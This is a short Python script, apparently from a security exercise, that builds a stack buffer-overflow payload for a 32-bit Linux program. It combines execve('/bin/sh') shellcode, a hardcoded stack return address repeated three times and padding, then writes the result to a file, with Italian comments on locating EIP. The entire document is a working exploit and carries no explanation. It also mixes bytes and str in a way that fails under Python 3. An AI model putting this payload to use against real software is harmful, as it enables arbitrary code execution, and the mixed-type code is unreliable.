import struct

shellcode=(b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

indirizzo_buffer = int("0xbffff2f0",16)
indirizzo_shellcode = struct.pack("I", indirizzo_buffer+12)

payload = indirizzo_shellcode
payload += indirizzo_shellcode
payload += indirizzo_shellcode
payload += shellcode
payload += "A" * (68-len(payload))


#commenta la strcopy, trova l'EIP e dall'EIP togli 60 

with open ("badfilebof1", "wb") as f:
	f.write(payload)
